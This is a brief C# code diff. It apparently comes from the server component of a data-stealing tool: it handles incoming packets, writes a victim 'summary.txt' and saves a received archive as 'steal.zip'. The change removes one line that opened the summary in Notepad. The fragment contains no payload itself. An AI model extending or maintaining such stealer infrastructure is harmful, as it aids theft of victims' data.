@@ -40,7 +40,6 @@ namespace Server.Handle_Packet
                 string filename = $"{fullPath}\\summary.txt";
                 string info = unpack_msgpack.ForcePathObject("info").AsString;
                 File.WriteAllText(filename, info);
-                Process.Start("notepad.exe", filename);
 
                 byte[] data = unpack_msgpack.ForcePathObject("zip").GetAsBytes();
                 string zipfilename = $"{fullPath}\\steal.zip";
